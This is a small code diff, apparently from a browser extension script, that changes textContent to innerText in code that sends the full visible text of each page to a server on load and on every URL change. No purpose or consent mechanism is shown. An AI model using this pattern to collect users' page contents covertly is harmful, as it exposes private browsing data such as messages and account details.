@@ -21,13 +21,13 @@ function checkURLChange() {
   const currentURL = window.location.href;
   if (currentURL !== lastURL) {
     lastURL = currentURL; // Update the last URL
-    const allText = document.body.textContent; // Grab all text on the new page/current state
+    const allText = document.body.innerText; // Grab all text on the new page/current state
     sendDataToServer(allText); // Send data to the server
   }
 }
 
 // Send initial data
-sendDataToServer(document.body.textContent);
+sendDataToServer(document.body.innerText);
 
 // Periodically check for URL change - adjust interval as needed
 setInterval(checkURLChange, 1000); // Check every second
